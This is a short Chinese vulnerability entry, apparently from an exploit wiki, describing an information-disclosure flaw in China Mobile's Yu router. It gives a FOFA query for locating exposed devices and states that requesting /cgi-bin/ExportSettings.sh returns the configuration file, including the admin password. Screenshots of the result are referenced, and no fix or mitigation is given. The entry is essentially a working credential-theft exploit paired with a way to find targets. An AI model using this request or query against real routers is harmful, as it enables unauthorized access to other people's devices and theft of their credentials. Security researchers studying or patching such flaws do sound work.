# 中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞

## 漏洞描述

中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息

## 漏洞影响

> [!NOTE]
>
> 中国移动 禹路由

## FOFA

> [!NOTE]
>
> title="互联世界 物联未来-登录"

## 漏洞复现

登录页面如下

![image-20210618173233203](http://wikioss.peiqi.tech/vuln/image-20210618173233203.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

访问Url

```
/cgi-bin/ExportSettings.sh
```

![image-20210618180802731](http://wikioss.peiqi.tech/vuln/image-20210618180802731.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

其中password为登录后台密码